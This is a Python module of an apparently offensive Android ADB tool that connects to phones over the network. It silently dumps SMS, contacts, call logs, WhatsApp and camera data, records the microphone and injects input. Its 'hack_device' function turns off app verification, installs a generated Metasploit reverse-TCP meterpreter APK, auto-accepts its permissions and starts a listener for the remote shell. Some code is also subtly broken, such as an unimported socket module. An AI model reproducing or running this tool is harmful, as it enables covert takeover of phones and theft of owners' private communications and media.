import os
import time
import subprocess
import nmap
from modules.helpers import (
    run_command, get_timestamp, ensure_dir, open_file, clear_screen,
    get_local_ip, input_with_default, confirm_action, DOWNLOAD_DIR
)
from modules.color import Color as C

ensure_dir(DOWNLOAD_DIR)

# Global settings
screenshot_location = DOWNLOAD_DIR
screenrecord_location = DOWNLOAD_DIR
pull_location = DOWNLOAD_DIR

def check_adb_installed():
    """Check if ADB is available in PATH."""
    try:
        subprocess.run(['adb', 'version'], capture_output=True, check=True)
        return True
    except (FileNotFoundError, subprocess.CalledProcessError):
        return False

def check_scrcpy_installed():
    """Check if scrcpy is installed."""
    try:
        subprocess.run(['scrcpy', '--version'], capture_output=True, check=True)
        return True
    except (FileNotFoundError, subprocess.CalledProcessError):
        return False

def check_nmap_installed():
    """Check if nmap is installed."""
    try:
        nmap.PortScanner()
        return True
    except:
        return False

def connect_device(ip=None):
    """Connect to a device via ADB over TCP/IP."""
    if not ip:
        ip = input(f"{C.WHITE}Enter target IP (e.g., 192.168.1.23): {C.RESET}").strip()
    if not ip:
        print(f"{C.RED}[!] No IP entered.{C.RESET}")
        return
    if ip.count('.') != 3:
        print(f"{C.RED}[!] Invalid IP format.{C.RESET}")
        return
    run_command("adb kill-server")
    run_command("adb start-server")
    run_command(f"adb connect {ip}:5555")
    print(f"{C.GREEN}[+] Connection attempt to {ip} completed.{C.RESET}")

def list_devices():
    """List connected ADB devices."""
    print(f"\n{C.CYAN}Connected devices:{C.RESET}")
    run_command("adb devices -l")
    print()

def disconnect_all():
    """Disconnect all ADB devices."""
    run_command("adb disconnect")
    print(f"{C.GREEN}[+] All devices disconnected.{C.RESET}")

def scan_network():
    """Scan local network for devices using nmap."""
    if not check_nmap_installed():
        print(f"{C.RED}[!] python-nmap not installed. Run: pip install python-nmap{C.RESET}")
        return
    print(f"{C.CYAN}[*] Scanning local network for devices...{C.RESET}")
    ip = get_local_ip()
    ip_range = ip.rsplit('.', 1)[0] + '.0/24'
    nm = nmap.PortScanner()
    nm.scan(hosts=ip_range, arguments='-sn')
    found = False
    for host in nm.all_hosts():
        if nm[host].state() == 'up':
            found = True
            try:
                hostname = socket.gethostbyaddr(host)[0]
            except:
                hostname = "Unknown"
            mac = ""
            if 'mac' in nm[host]['addresses']:
                mac = nm[host]['addresses']['mac']
            vendor = nm[host]['vendor'].get(mac, "") if mac else ""
            print(f"{C.GREEN}[+] {host:<15} {vendor:<20} {hostname}{C.RESET}")
    if not found:
        print(f"{C.YELLOW}[*] No devices found.{C.RESET}")
    print()

def mirror_device(mode='default'):
    """Mirror and control device screen using scrcpy."""
    if not check_scrcpy_installed():
        print(f"{C.RED}[!] scrcpy is not installed. Install it from https://github.com/Genymobile/scrcpy{C.RESET}")
        return
    print(f"{C.YELLOW}[*] Starting screen mirroring. Press Ctrl+C in terminal to stop.{C.RESET}")
    if mode == 'fast':
        run_command("scrcpy -m 1024 -b 1M")
    elif mode == 'custom':
        size = input(f"{C.WHITE}Size limit (e.g., 1024, leave blank for default): {C.RESET}")
        bitrate = input(f"{C.WHITE}Bitrate in Mbps (e.g., 2, leave blank for default 8): {C.RESET}")
        fps = input(f"{C.WHITE}Max FPS (e.g., 15, leave blank for default): {C.RESET}")
        cmd = "scrcpy"
        if size: cmd += f" -m {size}"
        if bitrate: cmd += f" -b {bitrate}M"
        if fps: cmd += f" --max-fps={fps}"
        run_command(cmd)
    else:
        run_command("scrcpy")

def take_screenshot(anonymous=False):
    """Take a screenshot from the device."""
    global screenshot_location
    if not screenshot_location:
        screenshot_location = input_with_default(
            f"{C.WHITE}Enter save location (default: {DOWNLOAD_DIR}): {C.RESET}", DOWNLOAD_DIR
        )
    ensure_dir(screenshot_location)
    filename = f"screenshot-{get_timestamp()}.png"
    print(f"{C.YELLOW}[*] Capturing screenshot...{C.RESET}")
    run_command(f"adb shell screencap -p /sdcard/{filename}")
    run_command(f"adb pull /sdcard/{filename} \"{screenshot_location}\"")
    if anonymous:
        run_command(f"adb shell rm /sdcard/{filename}")
        print(f"{C.GREEN}[+] Anonymous screenshot saved and removed from device.{C.RESET}")
    else:
        print(f"{C.GREEN}[+] Screenshot saved to {screenshot_location}/{filename}{C.RESET}")
    if confirm_action("Open file?"):
        open_file(os.path.join(screenshot_location, filename))

def screen_record(anonymous=False):
    """Record device screen."""
    global screenrecord_location
    duration = input(f"{C.WHITE}Enter duration in seconds: {C.RESET}").strip()
    if not duration.isdigit():
        print(f"{C.RED}[!] Invalid duration.{C.RESET}")
        return
    if not screenrecord_location:
        screenrecord_location = input_with_default(
            f"{C.WHITE}Enter save location (default: {DOWNLOAD_DIR}): {C.RESET}", DOWNLOAD_DIR
        )
    ensure_dir(screenrecord_location)
    filename = f"screenrecord-{get_timestamp()}.mp4"
    print(f"{C.YELLOW}[*] Recording for {duration} seconds...{C.RESET}")
    run_command(f"adb shell screenrecord --time-limit {duration} /sdcard/{filename}")
    run_command(f"adb pull /sdcard/{filename} \"{screenrecord_location}\"")
    if anonymous:
        run_command(f"adb shell rm /sdcard/{filename}")
        print(f"{C.GREEN}[+] Anonymous recording saved and removed from device.{C.RESET}")
    else:
        print(f"{C.GREEN}[+] Video saved to {screenrecord_location}/{filename}{C.RESET}")
    if confirm_action("Open file?"):
        open_file(os.path.join(screenrecord_location, filename))

def pull_file():
    """Download a file or folder from device."""
    global pull_location
    remote_path = input(f"{C.WHITE}Enter remote path (e.g., /sdcard/Download/file.txt): {C.RESET}").strip()
    if not remote_path:
        print(f"{C.RED}[!] No path entered.{C.RESET}")
        return
    if not pull_location:
        pull_location = input_with_default(
            f"{C.WHITE}Enter save location (default: {DOWNLOAD_DIR}): {C.RESET}", DOWNLOAD_DIR
        )
    ensure_dir(pull_location)
    run_command(f"adb pull \"{remote_path}\" \"{pull_location}\"")
    print(f"{C.GREEN}[+] File pulled to {pull_location}{C.RESET}")

def push_file():
    """Upload a file to device."""
    local_path = input(f"{C.WHITE}Enter local file path: {C.RESET}").strip()
    if not os.path.exists(local_path):
        print(f"{C.RED}[!] File not found.{C.RESET}")
        return
    dest = input(f"{C.WHITE}Enter destination on device (e.g., /sdcard/): {C.RESET}").strip()
    if not dest:
        dest = "/sdcard/"
    run_command(f"adb push \"{local_path}\" \"{dest}\"")
    print(f"{C.GREEN}[+] File pushed.{C.RESET}")

def install_apk():
    """Install an APK on the device."""
    apk_path = input(f"{C.WHITE}Enter APK path: {C.RESET}").strip()
    if not os.path.isfile(apk_path):
        print(f"{C.RED}[!] APK file not found.{C.RESET}")
        return
    run_command(f"adb install -r \"{apk_path}\"")
    print(f"{C.GREEN}[+] Installation attempted.{C.RESET}")

def uninstall_app():
    """Uninstall an app by package name."""
    pkg = input(f"{C.WHITE}Enter package name: {C.RESET}").strip()
    if pkg:
        run_command(f"adb uninstall {pkg}")
    else:
        print(f"{C.RED}[!] No package entered.{C.RESET}")

def list_apps(third_party_only=True):
    """List installed packages."""
    cmd = "adb shell pm list packages" + (" -3" if third_party_only else "")
    output = run_command(cmd, capture_output=True)
    if output:
        packages = [p.replace("package:", "") for p in output.splitlines() if p]
        for i, pkg in enumerate(packages, 1):
            print(f"{C.GREEN}{i:3}. {pkg}{C.RESET}")
        print()
    else:
        print(f"{C.RED}[!] No packages found or device not connected.{C.RESET}")

def run_app():
    """Launch an app by package name."""
    pkg = input(f"{C.WHITE}Enter package name: {C.RESET}").strip()
    if pkg:
        run_command(f"adb shell monkey -p {pkg} 1")
        print(f"{C.GREEN}[+] App launched.{C.RESET}")
    else:
        print(f"{C.RED}[!] No package entered.{C.RESET}")

def get_shell():
    """Open an interactive ADB shell."""
    print(f"{C.YELLOW}[*] Entering ADB shell. Type 'exit' to return.{C.RESET}")
    subprocess.run("adb shell", shell=True)

def list_files():
    """List files in /sdcard/."""
    run_command("adb shell ls -la /sdcard/")

def send_sms():
    """Send SMS via ADB (beta, may not work on all devices)."""
    print(f"{C.YELLOW}[!] This feature is experimental and may not work on all devices.{C.RESET}")
    number = input(f"{C.WHITE}Enter phone number with country code: {C.RESET}").strip()
    message = input(f"{C.WHITE}Enter message: {C.RESET}").strip()
    if not number or not message:
        print(f"{C.RED}[!] Number and message required.{C.RESET}")
        return
    cmd = (f'adb shell service call isms 5 i32 0 s16 "com.android.mms.service" s16 "null" '
           f's16 "{number}" s16 "null" s16 "{message}" s16 "null" s16 "null" s16 "null" s16 "null"')
    run_command(cmd)
    print(f"{C.GREEN}[+] SMS sent (if supported).{C.RESET}")

def copy_whatsapp():
    """Copy WhatsApp data from device."""
    global pull_location
    if not pull_location:
        pull_location = input_with_default(
            f"{C.WHITE}Enter save location (default: {DOWNLOAD_DIR}): {C.RESET}", DOWNLOAD_DIR
        )
    ensure_dir(pull_location)
    paths = ["/sdcard/Android/media/com.whatsapp/WhatsApp", "/sdcard/WhatsApp"]
    for path in paths:
        if run_command(f"adb shell test -d {path}", capture_output=True) == 0:
            run_command(f"adb pull {path} \"{pull_location}/WhatsApp\"")
            print(f"{C.GREEN}[+] WhatsApp data pulled to {pull_location}/WhatsApp{C.RESET}")
            return
    print(f"{C.RED}[!] WhatsApp folder not found.{C.RESET}")

def copy_screenshots():
    """Copy all screenshots from device."""
    global pull_location
    if not pull_location:
        pull_location = input_with_default(
            f"{C.WHITE}Enter save location (default: {DOWNLOAD_DIR}): {C.RESET}", DOWNLOAD_DIR
        )
    ensure_dir(pull_location)
    paths = ["/sdcard/Pictures/Screenshots", "/sdcard/DCIM/Screenshots", "/sdcard/Screenshots"]
    for path in paths:
        if run_command(f"adb shell test -d {path}", capture_output=True) == 0:
            run_command(f"adb pull {path} \"{pull_location}/Screenshots\"")
            print(f"{C.GREEN}[+] Screenshots pulled.{C.RESET}")
            return
    print(f"{C.RED}[!] Screenshots folder not found.{C.RESET}")

def copy_camera():
    """Copy camera photos from device."""
    global pull_location
    if not pull_location:
        pull_location = input_with_default(
            f"{C.WHITE}Enter save location (default: {DOWNLOAD_DIR}): {C.RESET}", DOWNLOAD_DIR
        )
    ensure_dir(pull_location)
    if run_command("adb shell test -d /sdcard/DCIM/Camera", capture_output=True) == 0:
        run_command(f"adb pull /sdcard/DCIM/Camera \"{pull_location}/Camera\"")
        print(f"{C.GREEN}[+] Camera photos pulled.{C.RESET}")
    else:
        print(f"{C.RED}[!] Camera folder not found.{C.RESET}")

def get_device_info():
    """Display device information."""
    props = {
        "Model": "ro.product.model",
        "Manufacturer": "ro.product.manufacturer",
        "Chipset": "ro.product.board",
        "Android Version": "ro.build.version.release",
        "Security Patch": "ro.build.version.security_patch",
        "Device": "ro.product.vendor.device",
        "SIM Operator": "gsm.sim.operator.alpha",
        "Encryption State": "ro.crypto.state",
        "Build Date": "ro.build.date",
        "SDK Version": "ro.build.version.sdk",
        "WiFi Interface": "wifi.interface"
    }
    print(f"\n{C.CYAN}Device Information:{C.RESET}")
    for name, prop in props.items():
        value = run_command(f"adb shell getprop {prop}", capture_output=True).strip()
        print(f"{C.GREEN}{name:<18}: {C.WHITE}{value}{C.RESET}")

def get_battery_info():
    """Display battery information."""
    output = run_command("adb shell dumpsys battery", capture_output=True)
    print(f"\n{C.CYAN}Battery Information:{C.RESET}")
    print(output)

def reboot_device(mode='system'):
    """Reboot the device."""
    if mode == 'recovery':
        run_command("adb reboot recovery")
    elif mode == 'bootloader':
        run_command("adb reboot bootloader")
    elif mode == 'fastboot':
        run_command("adb reboot fastboot")
    else:
        run_command("adb reboot")
    print(f"{C.GREEN}[+] Device rebooting...{C.RESET}")

def unlock_device():
    """Attempt to unlock device (swipe and possible password)."""
    password = input(f"{C.WHITE}Enter PIN/password (leave blank for swipe only): {C.RESET}")
    run_command("adb shell input keyevent 26")  # Power button to wake
    run_command("adb shell input swipe 200 900 200 300 200")  # Swipe up
    if password:
        run_command(f"adb shell input text {password}")
        run_command("adb shell input keyevent 66")  # Enter
    print(f"{C.GREEN}[+] Unlock attempt completed.{C.RESET}")

def lock_device():
    """Lock the device screen."""
    run_command("adb shell input keyevent 26")
    print(f"{C.GREEN}[+] Device locked.{C.RESET}")

def power_off():
    """Power off the device."""
    if confirm_action("Powering off will disconnect. Continue?"):
        run_command("adb shell reboot -p")
        print(f"{C.GREEN}[+] Device powering off...{C.RESET}")

def stop_adb():
    """Kill ADB server."""
    run_command("adb kill-server")
    print(f"{C.GREEN}[+] ADB server stopped.{C.RESET}")

def dump_sms():
    """Extract SMS messages to a file."""
    global pull_location
    if not pull_location:
        pull_location = input_with_default(
            f"{C.WHITE}Enter save location (default: {DOWNLOAD_DIR}): {C.RESET}", DOWNLOAD_DIR
        )
    ensure_dir(pull_location)
    filename = f"sms_dump-{get_timestamp()}.txt"
    cmd = f'adb shell content query --uri content://sms/ --projection address:date:body > "{pull_location}/{filename}"'
    run_command(cmd)
    print(f"{C.GREEN}[+] SMS dump saved to {pull_location}/{filename}{C.RESET}")

def dump_contacts():
    """Extract contacts to a file."""
    global pull_location
    if not pull_location:
        pull_location = input_with_default(
            f"{C.WHITE}Enter save location (default: {DOWNLOAD_DIR}): {C.RESET}", DOWNLOAD_DIR
        )
    ensure_dir(pull_location)
    filename = f"contacts_dump-{get_timestamp()}.txt"
    cmd = f'adb shell content query --uri content://contacts/phones/ --projection display_name:number > "{pull_location}/{filename}"'
    run_command(cmd)
    print(f"{C.GREEN}[+] Contacts dump saved to {pull_location}/{filename}{C.RESET}")

def dump_call_logs():
    """Extract call logs to a file."""
    global pull_location
    if not pull_location:
        pull_location = input_with_default(
            f"{C.WHITE}Enter save location (default: {DOWNLOAD_DIR}): {C.RESET}", DOWNLOAD_DIR
        )
    ensure_dir(pull_location)
    filename = f"call_logs_dump-{get_timestamp()}.txt"
    cmd = f'adb shell content query --uri content://call_log/calls --projection name:number:duration:date > "{pull_location}/{filename}"'
    run_command(cmd)
    print(f"{C.GREEN}[+] Call logs saved to {pull_location}/{filename}{C.RESET}")

def extract_apk():
    """Extract an APK from an installed app."""
    global pull_location
    pkg = input(f"{C.WHITE}Enter package name: {C.RESET}").strip()
    if not pkg:
        print(f"{C.RED}[!] No package entered.{C.RESET}")
        return
    # Get APK path
    path_output = run_command(f"adb shell pm path {pkg}", capture_output=True)
    if not path_output:
        print(f"{C.RED}[!] Package not found.{C.RESET}")
        return
    apk_path = path_output.strip().replace("package:", "")
    if not pull_location:
        pull_location = input_with_default(
            f"{C.WHITE}Enter save location (default: {DOWNLOAD_DIR}): {C.RESET}", DOWNLOAD_DIR
        )
    ensure_dir(pull_location)
    run_command(f"adb pull {apk_path} \"{pull_location}/{pkg}.apk\"")
    print(f"{C.GREEN}[+] APK extracted to {pull_location}/{pkg}.apk{C.RESET}")

def use_keycodes():
    """Interactive keycode injection menu."""
    keycodes = {
        '1': ('Text Input', lambda: run_command(f"adb shell input text \"{input('Enter text: ')}\"")),
        '2': ('Home', lambda: run_command("adb shell input keyevent 3")),
        '3': ('Back', lambda: run_command("adb shell input keyevent 4")),
        '4': ('Recent Apps', lambda: run_command("adb shell input keyevent 187")),
        '5': ('Power', lambda: run_command("adb shell input keyevent 26")),
        '6': ('DPAD Up', lambda: run_command("adb shell input keyevent 19")),
        '7': ('DPAD Down', lambda: run_command("adb shell input keyevent 20")),
        '8': ('DPAD Left', lambda: run_command("adb shell input keyevent 21")),
        '9': ('DPAD Right', lambda: run_command("adb shell input keyevent 22")),
        '10': ('Delete/Backspace', lambda: run_command("adb shell input keyevent 67")),
        '11': ('Enter', lambda: run_command("adb shell input keyevent 66")),
        '12': ('Volume Up', lambda: run_command("adb shell input keyevent 24")),
        '13': ('Volume Down', lambda: run_command("adb shell input keyevent 25")),
        '14': ('Media Play', lambda: run_command("adb shell input keyevent 126")),
        '15': ('Media Pause', lambda: run_command("adb shell input keyevent 127")),
        '16': ('Tab', lambda: run_command("adb shell input keyevent 61")),
        '17': ('Esc', lambda: run_command("adb shell input keyevent 111")),
    }
    while True:
        clear_screen()
        print(f"{C.CYAN}Keycode Injection Menu:{C.RESET}\n")
        for k, v in keycodes.items():
            print(f"{C.WHITE}{k:>3}. {C.GREEN}{v[0]}{C.RESET}")
        print(f"\n{C.YELLOW}0. Back to Main Menu{C.RESET}")
        choice = input(f"{C.RED}[Keycode] {C.WHITE}Select > {C.RESET}").strip()
        if choice == '0':
            break
        elif choice in keycodes:
            keycodes[choice][1]()
            input(f"{C.GREEN}Press Enter to continue...{C.RESET}")
        else:
            print(f"{C.RED}Invalid option.{C.RESET}")

def update_tool():
    """Update the tool from GitHub."""
    if run_command("git --version", capture_output=True) == 0:
        print(f"{C.YELLOW}[*] Fetching updates...{C.RESET}")
        run_command("git fetch")
        run_command("git rebase")
        print(f"{C.GREEN}[+] Update complete. Restart the tool.{C.RESET}")
    else:
        print(f"{C.RED}[!] Git not found. Please update manually.{C.RESET}")

def open_link():
    """Open a URL on the device."""
    url = input(f"{C.WHITE}Enter URL: {C.RESET}").strip()
    if url:
        run_command(f"adb shell am start -a android.intent.action.VIEW -d {url}")
        print(f"{C.GREEN}[+] Link opened.{C.RESET}")

def display_photo():
    """Push and display a photo on device."""
    local_path = input(f"{C.WHITE}Enter photo path: {C.RESET}").strip()
    if not os.path.isfile(local_path):
        print(f"{C.RED}[!] File not found.{C.RESET}")
        return
    filename = os.path.basename(local_path)
    run_command(f"adb push \"{local_path}\" /sdcard/{filename}")
    run_command(f"adb shell am start -a android.intent.action.VIEW -d \"file:///sdcard/{filename}\" -t image/jpeg")
    print(f"{C.GREEN}[+] Photo displayed.{C.RESET}")

def play_audio():
    """Push and play an audio file on device."""
    local_path = input(f"{C.WHITE}Enter audio path: {C.RESET}").strip()
    if not os.path.isfile(local_path):
        print(f"{C.RED}[!] File not found.{C.RESET}")
        return
    filename = os.path.basename(local_path)
    run_command(f"adb push \"{local_path}\" /sdcard/{filename}")
    run_command(f"adb shell am start -a android.intent.action.VIEW -d \"file:///sdcard/{filename}\" -t audio/mp3")
    print(f"{C.GREEN}[+] Audio playing.{C.RESET}")

def play_video():
    """Push and play a video file on device."""
    local_path = input(f"{C.WHITE}Enter video path: {C.RESET}").strip()
    if not os.path.isfile(local_path):
        print(f"{C.RED}[!] File not found.{C.RESET}")
        return
    filename = os.path.basename(local_path)
    run_command(f"adb push \"{local_path}\" /sdcard/{filename}")
    run_command(f"adb shell am start -a android.intent.action.VIEW -d \"file:///sdcard/{filename}\" -t video/mp4")
    print(f"{C.GREEN}[+] Video playing.{C.RESET}")

def hack_device():
    """Launch Metasploit payload generation and handler."""
    if not confirm_action("This will attempt to hack the device. Continue?"):
        return
    # Instructions banner
    clear_screen()
    print(f"""{C.CYAN}
        ____           __                  __  _                 
       /  _/___  _____/ /________  _______/ /_(_)___  ____  _____
       / // __ \/ ___/ __/ ___/ / / / ___/ __/ / __ \/ __ \/ ___/
     _/ // / / (__  ) /_/ /  / /_/ / /__/ /_/ / /_/ / / / (__  ) 
    /___/_/ /_/____/\__/_/   \__,_/\___/\__/_/\____/_/ /_/____/  
        {C.RESET}""")
    print(f"{C.YELLOW}This attack will launch Metasploit-Framework (msfconsole){C.RESET}")
    print("Use 'Ctrl + C' to stop at any point\n")
    input("Press Enter to continue...")
    
    ip = get_local_ip()
    lport = "4444"
    print(f"\n{C.CYAN}Using LHOST: {ip} and LPORT: {lport}{C.RESET}")
    modify = input("Press Enter to continue or 'M' to modify > ").lower()
    if modify == 'm':
        ip = input("Enter LHOST: ").strip() or ip
        lport = input("Enter LPORT: ").strip() or lport
    
    print(f"{C.YELLOW}[*] Creating payload APK...{C.RESET}")
    run_command(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={lport} -o payload.apk")
    
    print(f"{C.YELLOW}[*] Installing payload on device...{C.RESET}")
    run_command("adb shell settings put global package_verifier_enable 0")
    run_command("adb shell settings put global verifier_verify_adb_installs 0")
    run_command("adb install -r payload.apk")
    
    print(f"{C.YELLOW}[*] Launching payload...{C.RESET}")
    run_command("adb shell monkey -p com.metasploit.stage 1")
    time.sleep(2)
    # Auto-accept permissions
    run_command("adb shell input keyevent 22")
    run_command("adb shell input keyevent 22")
    run_command("adb shell input keyevent 66")
    
    print(f"{C.YELLOW}[*] Starting Metasploit handler...{C.RESET}")
    run_command(f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {lport}; exploit'")
    
    # Cleanup
    run_command("adb shell settings put global package_verifier_enable 1")
    run_command("adb shell settings put global verifier_verify_adb_installs 1")
    os.remove("payload.apk")
    print(f"{C.GREEN}[+] Hack session ended.{C.RESET}")

def record_audio(source='mic', stream=False):
    """Record or stream audio from device (Android 11+)."""
    if not check_scrcpy_installed():
        print(f"{C.RED}[!] scrcpy required.{C.RESET}")
        return
    # Check Android version
    version_str = run_command("adb shell getprop ro.build.version.release", capture_output=True).strip()
    try:
        major_version = int(version_str.split('.')[0])
        if major_version < 11:
            print(f"{C.RED}[!] This feature requires Android 11 or higher.{C.RESET}")
            return
    except:
        pass
    
    if stream:
        cmd = "scrcpy --no-video"
        if source == 'mic':
            cmd += " --audio-source=mic"
        print(f"{C.YELLOW}[*] Streaming audio. Press Ctrl+C to stop.{C.RESET}")
        run_command(cmd)
    else:
        global pull_location
        if not pull_location:
            pull_location = input_with_default(f"Save location (default: {DOWNLOAD_DIR}): ", DOWNLOAD_DIR)
        ensure_dir(pull_location)
        filename = f"{source}-audio-{get_timestamp()}.opus"
        cmd = f"scrcpy --no-video --no-playback --record={pull_location}/{filename}"
        if source == 'mic':
            cmd += " --audio-source=mic"
        print(f"{C.YELLOW}[*] Recording audio. Press Ctrl+C to stop.{C.RESET}")
        run_command(cmd)
        print(f"{C.GREEN}[+] Audio saved to {pull_location}/{filename}{C.RESET}")
        if confirm_action("Open file?"):
            open_file(os.path.join(pull_location, filename))